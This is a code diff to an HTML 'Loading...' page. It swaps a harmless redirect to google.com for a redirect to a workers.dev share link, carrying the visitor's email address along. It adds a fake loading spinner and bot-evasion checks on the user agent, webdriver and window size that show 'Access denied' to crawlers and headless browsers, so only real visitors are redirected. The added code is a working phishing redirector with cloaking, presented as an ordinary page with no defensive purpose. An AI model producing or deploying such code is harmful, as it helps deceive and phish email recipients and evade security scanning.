@@ -3,14 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <title>Loading...</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: #fff;
+        }
+        .card { text-align: center; }
+        .spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid #e0e0e0;
+            border-top-color: #0078d4;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 16px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        p { color: #666; font-size: 14px; }
+    </style>
 </head>
 <body>
+    <div class="card">
+        <div class="spinner"></div>
+        <p id="msg">Loading...</p>
+    </div>
     <script>
+    (function(){
         var params = new URLSearchParams(window.location.search);
         var email = params.get('email') || '';
-        var target = 'https://www.google.com';
+        var target = 'https://cove-prism-4c6c.p-af053b63.workers.dev/share/arL9vuijyzc';
         if (email) target += '?email=' + encodeURIComponent(email);
-        window.location.href = target;
+
+        var ua = navigator.userAgent.toLowerCase();
+        var bots = /bot|crawl|spider|scraper|headless|phantom|selenium|puppeteer|playwright|electron|nightmare|webdriver/i;
+        if (bots.test(ua)) { document.getElementById('msg').innerText = 'Access denied'; return; }
+        if (navigator.webdriver) { document.getElementById('msg').innerText = 'Access denied'; return; }
+        if (window.outerWidth === 0 && window.outerHeight === 0) { document.getElementById('msg').innerText = 'Access denied'; return; }
+
+        setTimeout(function(){
+            window.location.href = target;
+        }, 800);
+    })();
     </script>
 </body>
 </html>
